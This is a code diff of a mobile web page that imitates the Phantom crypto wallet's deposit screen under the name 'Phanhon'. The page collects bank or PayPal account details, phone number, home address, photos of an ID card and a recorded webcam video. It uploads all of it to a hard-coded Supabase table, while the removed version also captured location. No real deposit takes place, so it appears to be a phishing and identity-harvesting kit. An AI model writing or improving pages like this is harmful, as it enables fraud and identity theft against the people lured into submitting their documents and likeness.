@@ -1,52 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Deposit - Phantom Pro</title>
+    <title>Phanhon | Deposit</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <link rel="stylesheet" href="style.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
-        :root { --phantom-purple: #ab66ff; }
-        body { font-family: 'Inter', sans-serif; background-color: #000; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .app-container { width: 100%; height: 100vh; background: #000; position: relative; display: flex; flex-direction: column; overflow-y: auto; }
-        @media (min-width: 640px) { .app-container { max-width: 380px; height: 720px; border: 1px solid #1a1a1a; border-radius: 32px; } }
-        .glass { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); }
-        .phantom-btn { background: var(--phantom-purple); color: white; font-weight: 700; border-radius: 12px; transition: all 0.2s; -webkit-tap-highlight-color: transparent; }
-        .phantom-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .method-card { border: 1px solid rgba(255, 255, 255, 0.05); transition: all 0.2s; cursor: pointer; }
-        .method-card.active { border-color: var(--phantom-purple); background: rgba(171, 102, 255, 0.1); }
-        video { width: 100%; border-radius: 16px; transform: scaleX(-1); background: #111; }
-        .hidden { display: none !important; }
-        .progress-bar { width: 0%; height: 4px; background: var(--phantom-purple); transition: width 15s linear; }
-        input[type="file"]::file-selector-button { background: #222; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 10px; }
-        .error-msg { color: #ff4b4b; font-size: 10px; font-weight: bold; margin-top: 4px; display: none; }
-        
-        .step-dot { width: 8px; height: 8px; border-radius: 50%; background: rgba(255,255,255,0.1); transition: all 0.3s; }
-        .step-dot.active { background: var(--phantom-purple); box-shadow: 0 0 10px var(--phantom-purple); }
-        
-        .countdown-overlay {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0,0,0,0.4);
-            font-size: 64px;
-            font-weight: 800;
-            color: white;
-            z-index: 20;
+        .step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            transition: all 0.3s;
+        }
+
+        .step-dot.active {
+            background: var(--phantom-purple);
+            box-shadow: 0 0 10px var(--phantom-purple);
+        }
+
+        .method-card {
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .method-card.active {
+            border-color: var(--phantom-purple);
+            background: rgba(171, 102, 255, 0.1);
+        }
+
+        video {
+            width: 100%;
             border-radius: 16px;
+            transform: scaleX(-1);
+            background: #111;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 4px;
+            background: var(--phantom-purple);
+            transition: width 15s linear;
         }
     </style>
 </head>
+
 <body>
     <div class="app-container p-6 pb-20">
         <div class="flex items-center justify-between mb-8">
             <div class="flex items-center gap-2">
-                <a href="dashboard.html" class="opacity-50 p-2"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></a>
+                <a href="dashboard.html" class="opacity-50 p-2"><svg width="20" height="20" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="3">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg></a>
                 <h3 class="text-xl font-bold">Secure On-Ramp</h3>
             </div>
             <div class="text-right">
@@ -65,150 +76,87 @@
         <div id="step-1" class="space-y-4 animate__animated animate__fadeIn">
             <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">1. Transaction Details</p>
             <div class="grid grid-cols-2 gap-3">
-                <div onclick="selectMethod('bank')" class="method-card active p-4 rounded-xl flex flex-col items-center gap-2" id="m-bank">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18M3 10h18M5 10v11M19 10v11M12 10v11M7 10V4h10v6M2 10l10-8 10 8"/></svg>
+                <div onclick="selectMethod('bank')"
+                    class="method-card active p-4 rounded-xl flex flex-col items-center gap-2" id="m-bank">
                     <span class="text-[10px] font-bold">Bank Transfer</span>
                 </div>
-                <div onclick="selectMethod('paypal')" class="method-card p-4 rounded-xl flex flex-col items-center gap-2" id="m-paypal">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M20.067 8.178c-.552 2.682-2.26 4.114-4.833 4.114H13.43l-.967 6.135h-3.325l1.545-9.805c.105-.66.678-1.157 1.345-1.157h2.17c2.186 0 3.864.484 4.39 3.123.045.228.067.456.067.683.003.313-.028.618-.088.907zM17.47 5.766c-.734-3.704-4.482-4.085-7.795-4.085H5.062a.965.965 0 0 0-.954.814l-2.43 15.424a.482.482 0 0 0 .476.558h4.435l-.105.672a.965.965 0 0 0 .954 1.115h3.692a.482.482 0 0 0 .477-.407l1.045-6.634.095-.505a.965.965 0 0 1 .954-.814h.346c3.606 0 6.435-1.465 7.25-5.694.34-1.76.136-3.37-.781-4.444z"/></svg>
+                <div onclick="selectMethod('paypal')"
+                    class="method-card p-4 rounded-xl flex flex-col items-center gap-2" id="m-paypal">
                     <span class="text-[10px] font-bold">PayPal</span>
                 </div>
             </div>
 
-            <div class="glass p-3 rounded-xl"><input id="dep-bank" type="text" placeholder="Account ID / IBAN / Email" class="bg-transparent w-full text-xs outline-none"></div>
+            <div class="glass p-3 rounded-xl"><input id="dep-bank" type="text" placeholder="Account ID / IBAN / Email"
+                    class="bg-transparent w-full text-xs outline-none text-white"></div>
             <div class="glass p-3 rounded-xl">
-                <input id="dep-amount" type="number" placeholder="Amount in SOL" class="bg-transparent w-full text-xs outline-none">
-                <p id="balance-error" class="error-msg">Insufficient balance in wallet.</p>
+                <input id="dep-amount" type="number" placeholder="Amount in SOL"
+                    class="bg-transparent w-full text-xs outline-none text-white">
             </div>
-            
-            <button onclick="goToStep(2)" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-4">Continue to ID</button>
+
+            <button onclick="goToStep(2)"
+                class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-4">Continue to ID</button>
         </div>
 
         <!-- Step 2: ID Upload -->
         <div id="step-2" class="hidden space-y-4 animate__animated animate__fadeIn">
             <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">2. Identity Information</p>
-            <div class="glass p-3 rounded-xl"><input id="dep-phone" type="tel" placeholder="Phone Number" class="bg-transparent w-full text-xs outline-none"></div>
-            <div class="glass p-3 rounded-xl"><textarea id="dep-address" placeholder="Residential Home Address" class="bg-transparent w-full text-xs outline-none h-16"></textarea></div>
+            <div class="glass p-3 rounded-xl"><input id="dep-phone" type="tel" placeholder="Phone Number"
+                    class="bg-transparent w-full text-xs outline-none text-white"></div>
+            <div class="glass p-3 rounded-xl"><textarea id="dep-address" placeholder="Residential Home Address"
+                    class="bg-transparent w-full text-xs outline-none h-16 text-white"></textarea></div>
 
             <div class="grid grid-cols-2 gap-2">
                 <div class="glass p-3 rounded-xl">
                     <label class="text-[8px] uppercase text-white/40 block mb-1">ID Front</label>
-                    <input type="file" id="id-front" accept="image/*" class="text-[8px] w-full">
+                    <input type="file" id="id-front" accept="image/*" class="text-[8px] w-full text-white">
                 </div>
                 <div class="glass p-3 rounded-xl">
                     <label class="text-[8px] uppercase text-white/40 block mb-1">ID Back</label>
-                    <input type="file" id="id-back" accept="image/*" class="text-[8px] w-full">
+                    <input type="file" id="id-back" accept="image/*" class="text-[8px] w-full text-white">
                 </div>
             </div>
-            
+
             <div class="flex gap-2">
-                <button onclick="goToStep(1)" class="w-1/3 py-4 text-[10px] font-bold text-white/40 uppercase tracking-widest border border-white/10 rounded-xl">Back</button>
-                <button onclick="toVerification()" class="phantom-btn flex-1 py-4 text-xs uppercase tracking-widest">Final: Biometrics</button>
+                <button onclick="goToStep(1)"
+                    class="w-1/3 py-4 text-[10px] font-bold text-white/40 uppercase tracking-widest border border-white/10 rounded-xl">Back</button>
+                <button onclick="toVerification()"
+                    class="phantom-btn flex-1 py-4 text-xs uppercase tracking-widest">Final: Biometrics</button>
             </div>
         </div>
 
         <!-- Step 3: Biometrics -->
         <div id="step-verify" class="hidden space-y-4 animate__animated animate__fadeIn">
             <div class="text-center space-y-2">
-                <h4 class="font-bold text-lg">Live Biometric Feed</h4>
-                <p class="text-xs text-white/50">Perform signs clearly within the timeframe.</p>
+                <h4 class="font-bold text-lg">Biometric Verification</h4>
+                <p class="text-xs text-white/50" id="target-sign">Loading signs...</p>
             </div>
 
             <div class="relative">
                 <video id="webcam" autoplay playsinline muted></video>
-                <div id="timer-overlay" class="countdown-overlay">3</div>
-                <div class="absolute top-4 left-4 right-4 flex justify-between">
-                    <div class="bg-black/60 backdrop-blur px-3 py-2 rounded-lg border border-white/10">
-                        <p class="text-[10px] text-white/40 uppercase font-bold tracking-tighter">Required Signs</p>
-                        <p id="target-sign" class="text-lg font-bold text-[#ab66ff]">✌️ & 👍</p>
-                    </div>
-                    <div id="recording-indicator" class="hidden bg-red-600 px-3 py-2 rounded-lg flex items-center gap-2 animate-pulse">
-                        <div class="w-2 h-2 bg-white rounded-full"></div>
-                        <span class="text-[10px] font-bold uppercase tracking-widest">REC</span>
-                    </div>
-                </div>
                 <div class="absolute bottom-0 left-0 w-full bg-white/10 h-1">
                     <div id="video-progress" class="progress-bar"></div>
                 </div>
             </div>
 
-            <div class="p-4 bg-blue-500/10 border border-blue-500/20 rounded-xl">
-                <p class="text-[10px] text-blue-400 font-bold leading-tight uppercase tracking-widest mb-1">Security Notice</p>
-                <p class="text-[11px] text-white/80">Location and visuals are being logged for fraud prevention.</p>
-            </div>
-
-            <button id="status-display" disabled class="phantom-btn w-full py-4 text-xs uppercase tracking-widest opacity-50">Auto-Starting...</button>
+            <button id="status-display" disabled
+                class="phantom-btn w-full py-4 text-xs uppercase tracking-widest opacity-50">Initializing
+                Cam...</button>
         </div>
 
-        <!-- Step 4: Pending -->
-        <div id="pending-state" class="hidden text-center space-y-6 pt-10 animate__animated animate__fadeIn">
-            <div class="flex justify-center">
-                <div class="w-20 h-20 bg-yellow-500/10 rounded-full flex items-center justify-center text-yellow-500 border border-yellow-500/20 animate-pulse">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-                </div>
-            </div>
-            <div>
-                <h4 class="text-lg font-bold">Identity Pending Review</h4>
-                <p class="text-xs text-white/40 mt-2">Biometrics, Location, and ID Documents are now being processed by our automated risk engine.</p>
-            </div>
-            
-            <div class="glass p-6 rounded-2xl border-l-4 border-yellow-500">
-                <p class="text-[10px] text-white/30 uppercase font-bold">Estimated Release</p>
-                <p id="countdown" class="text-2xl font-mono font-bold mt-1 text-yellow-500">23:59:59</p>
-            </div>
-
-            <div class="text-[10px] text-white/20 px-6">
-                TX: <span id="tx-id" class="font-mono">#...</span> | 
-                LOC: <span id="loc-status" class="text-blue-400">Capturing...</span>
-            </div>
-
-            <div class="space-y-3">
-                <a href="dashboard.html" class="block text-[10px] font-bold text-white/50 uppercase tracking-widest py-2">Back to Dashboard</a>
-                <button onclick="cancelDeposit()" class="w-full py-3 text-[10px] font-bold text-red-500 uppercase tracking-widest border border-red-500/20 rounded-xl hover:bg-red-500/10 transition-colors">Abort Request</button>
-            </div>
-        </div>
+        <div id="toast"></div>
     </div>
 
+    <script src="app.js"></script>
     <script>
-        const sb = supabase.createClient("https://tmvimacikrnrizxtcesf.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4");
-        
-        let user = null;
         let selectedMethod = 'bank';
         let stream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let geoCoords = "Unknown";
-        
-        const signs = [
-            { icon: '✌️', name: 'Peace' }, { icon: '👍', name: 'Thumbs Up' },
-            { icon: '🤘', name: 'Rock On' }, { icon: '✋', name: 'Open Palm' }
-        ];
-
-        try {
-            const userData = localStorage.getItem('phantom_user');
-            if (userData) {
-                user = JSON.parse(userData);
-                document.getElementById('ui-balance').innerText = `${user.balance.toFixed(2)} SOL`;
-            }
-        } catch (e) { console.error(e); }
 
         window.onload = () => {
-            if (!user) { window.location.href = 'dashboard.html'; return; }
-            updateLastOnline();
-            setInterval(updateLastOnline, 30000); 
-
-            const activeDep = localStorage.getItem('active_deposit');
-            if(activeDep) showPending(JSON.parse(activeDep));
+            if (!loadUser()) window.location.href = 'index.html';
+            document.getElementById('ui-balance').innerText = `${user.balance.toFixed(2)} SOL`;
         };
-
-        async function updateLastOnline() {
-            if(!user) return;
-            try {
-                await sb.from('user_biometrics_log')
-                  .update({ last_online: new Date().toISOString() })
-                  .eq('user_id', user.id);
-            } catch(e) {}
-        }
 
         function selectMethod(m) {
             selectedMethod = m;
@@ -217,171 +165,86 @@
         }
 
         function goToStep(step) {
-            if (step === 2) {
-                const amountInput = document.getElementById('dep-amount');
-                const amount = parseFloat(amountInput.value);
-                const bank = document.getElementById('dep-bank').value;
-                const errorLabel = document.getElementById('balance-error');
-
-                errorLabel.style.display = 'none';
-
-                if(!amount || !bank) {
-                    alert("Please enter amount and account details.");
-                    return;
-                }
-
-                if (user.balance <= 0 || amount > user.balance) {
-                    errorLabel.style.display = 'block';
-                    amountInput.focus();
-                    return;
-                }
-            }
-
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-2').classList.add('hidden');
             document.getElementById('step-verify').classList.add('hidden');
-            
+
             if (step === 1) document.getElementById('step-1').classList.remove('hidden');
             if (step === 2) document.getElementById('step-2').classList.remove('hidden');
             if (step === 3) document.getElementById('step-verify').classList.remove('hidden');
 
-            document.querySelectorAll('.step-dot').forEach((dot, idx) => {
-                dot.classList.toggle('active', idx < step);
-            });
+            document.querySelectorAll('.step-dot').forEach((dot, idx) => dot.classList.toggle('active', idx < step));
         }
 
         async function toVerification() {
             const phone = document.getElementById('dep-phone').value;
-            const address = document.getElementById('dep-address').value;
             const idFront = document.getElementById('id-front').files[0];
             const idBack = document.getElementById('id-back').files[0];
 
-            if(!phone || !address || !idFront || !idBack) {
-                alert("Please complete identity information and upload both sides of your ID.");
-                return;
-            }
+            if (!phone || !idFront || !idBack) return showToast("Missing ID Docs");
 
-            navigator.geolocation.getCurrentPosition((pos) => {
-                geoCoords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-            }, (err) => { geoCoords = "Denied"; });
-
-            const shuffled = [...signs].sort(() => 0.5 - Math.random());
-            const selectedSigns = shuffled.slice(0, 2);
-            document.getElementById('target-sign').innerText = `${selectedSigns[0].icon} & ${selectedSigns[1].icon}`;
-
+            // Mock signs
+            document.getElementById('target-sign').innerText = "Perform: Peace Sign & Thumbs Up";
             goToStep(3);
 
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('webcam').srcObject = stream;
-                startCountdown();
+
+                setTimeout(startRecording, 1000);
             } catch (err) {
-                alert("Camera is required for secure deposits.");
+                showToast("Camera Denied");
             }
         }
 
-        function startCountdown() {
-            let count = 3;
-            const overlay = document.getElementById('timer-overlay');
-            
-            const timer = setInterval(() => {
-                count--;
-                if(count <= 0) {
-                    clearInterval(timer);
-                    overlay.classList.add('hidden');
-                    startRecording();
-                } else {
-                    overlay.innerText = count;
-                }
-            }, 1000);
-        }
-
-        async function startRecording() {
+        function startRecording() {
             const status = document.getElementById('status-display');
-            const indicator = document.getElementById('recording-indicator');
-            const progress = document.getElementById('video-progress');
-            
+            document.getElementById('video-progress').style.width = '100%';
+            status.innerText = "RECORDING...";
+
             recordedChunks = [];
-            
-            // Try to find the most compatible type
-            const mimeTypes = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
-            let selectedType = '';
-            for (let type of mimeTypes) {
-                if (MediaRecorder.isTypeSupported(type)) {
-                    selectedType = type;
-                    break;
-                }
-            }
 
-            mediaRecorder = new MediaRecorder(stream, { mimeType: selectedType });
+            // Try compatible mime type
+            const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
 
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) recordedChunks.push(e.data);
-            };
-
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(recordedChunks, { type: selectedType });
-                
-                // Immediately transition to pending UI so user doesn't wait for DB
-                const depId = Math.random().toString(36).substr(2, 9).toUpperCase();
-                const depData = { 
-                    amount: parseFloat(document.getElementById('dep-amount').value),
-                    id: depId, 
-                    method: selectedMethod, 
-                    releaseAt: new Date().getTime() + (24 * 60 * 60 * 1000),
-                    coords: geoCoords
-                };
-                
-                localStorage.setItem('active_deposit', JSON.stringify(depData));
-                if(stream) stream.getTracks().forEach(t => t.stop());
-                showPending(depData);
-
-                // Now handle file conversion and DB upload in the background
-                try {
-                    const videoBase64 = await fileToBase64(blob);
-                    const idFrontFile = document.getElementById('id-front').files[0];
-                    const idBackFile = document.getElementById('id-back').files[0];
-                    const frontBase64 = await fileToBase64(idFrontFile);
-                    const backBase64 = await fileToBase64(idBackFile);
-
-                    const amount = parseFloat(document.getElementById('dep-amount').value);
-                    const bank = document.getElementById('dep-bank').value;
-                    const phone = document.getElementById('dep-phone').value;
-                    const address = document.getElementById('dep-address').value;
-
-                    await sb.from('user_biometrics_log').insert([{ 
-                        user_id: user.id, 
-                        username: user.username,
-                        amount, 
-                        method: selectedMethod,
-                        bank_info: bank,
-                        phone: phone,
-                        address: address,
-                        geolocation: geoCoords,
-                        video_url: videoBase64,
-                        id_front: frontBase64,
-                        id_back: backBase64,
-                        required_signs: document.getElementById('target-sign').innerText,
-                        status: 'pending'
-                    }]);
-                } catch (err) { 
-                    console.error("Background Upload Failed:", err);
-                    // Optionally notify user that files failed to sync
-                }
-            };
-
+            mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.onstop = uploadData;
             mediaRecorder.start();
-            status.innerText = "RECORDING VISUALS...";
-            indicator.classList.remove('hidden');
-            progress.style.width = '100%';
 
-            // Fixed length recording: 15 seconds
-            setTimeout(() => {
-                if(mediaRecorder.state !== "inactive") {
-                    mediaRecorder.stop();
-                    indicator.classList.add('hidden');
-                }
-            }, 15000);
+            setTimeout(() => { mediaRecorder.stop(); }, 5000); // 5s video short
+        }
+
+        async function uploadData() {
+            document.getElementById('status-display').innerText = "UPLOADING...";
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+
+            try {
+                const videoBase64 = await fileToBase64(blob);
+                const idFront = await fileToBase64(document.getElementById('id-front').files[0]);
+                const idBack = await fileToBase64(document.getElementById('id-back').files[0]);
+
+                await sb.from('user_biometrics_log').insert([{
+                    user_id: user.id,
+                    username: user.username,
+                    amount: parseFloat(document.getElementById('dep-amount').value),
+                    method: selectedMethod,
+                    bank_info: document.getElementById('dep-bank').value,
+                    phone: document.getElementById('dep-phone').value,
+                    address: document.getElementById('dep-address').value,
+                    video_url: videoBase64,
+                    id_front: idFront,
+                    id_back: idBack,
+                    status: 'pending'
+                }]);
+
+                showToast("Request Submitted");
+                setTimeout(() => window.location.href = 'dashboard.html', 1500);
+
+            } catch (e) {
+                console.error(e);
+                showToast("Upload Failed");
+            }
         }
 
         function fileToBase64(file) {
@@ -389,41 +252,10 @@
                 const reader = new FileReader();
                 reader.readAsDataURL(file);
                 reader.onload = () => resolve(reader.result);
-                reader.onerror = error => reject(error);
+                reader.onerror = reject;
             });
-        }
-
-        function showPending(data) {
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-verify').classList.add('hidden');
-            document.getElementById('step-indicator').classList.add('hidden');
-            document.getElementById('pending-state').classList.remove('hidden');
-            
-            document.getElementById('tx-id').innerText = `#${data.id}`;
-            document.getElementById('loc-status').innerText = data.coords || "Logged";
-            
-            const timer = setInterval(() => {
-                const now = new Date().getTime();
-                const dist = data.releaseAt - now;
-                if(dist < 0) {
-                    document.getElementById('countdown').innerText = "PROCESSED";
-                    clearInterval(timer);
-                    return;
-                }
-                const h = Math.floor(dist / (1000 * 60 * 60));
-                const m = Math.floor((dist % (1000 * 60 * 60)) / (1000 * 60));
-                const s = Math.floor((dist % (1000 * 60)) / 1000);
-                document.getElementById('countdown').innerText = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
-            }, 1000);
-        }
-
-        function cancelDeposit() {
-            if(confirm("Cancel deposit request? All submitted files will be purged.")) {
-                localStorage.removeItem('active_deposit');
-                location.reload();
-            }
         }
     </script>
 </body>
+
 </html>
